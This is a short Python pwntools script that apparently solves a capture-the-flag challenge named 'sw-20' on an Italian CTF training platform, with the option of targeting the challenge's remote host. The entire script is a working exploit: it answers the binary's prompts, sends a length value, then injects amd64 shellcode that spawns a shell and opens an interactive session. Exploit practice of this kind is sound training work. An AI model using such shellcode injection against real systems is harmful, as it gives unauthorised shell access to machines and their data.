from pwn import *

elf = ELF('./sw-20')
context.binary = elf
if args.REMOTE:
    p = remote('software-20.challs.olicyber.it', 13003)
else:
    p = process([elf.path])

p.sendlineafter(b'iniziare ...',b'\n')
shellcode = asm(shellcraft.amd64.linux.sh())
p.sendlineafter(b': ',b'48')
p.sendlineafter(b': ',shellcode)

p.interactive()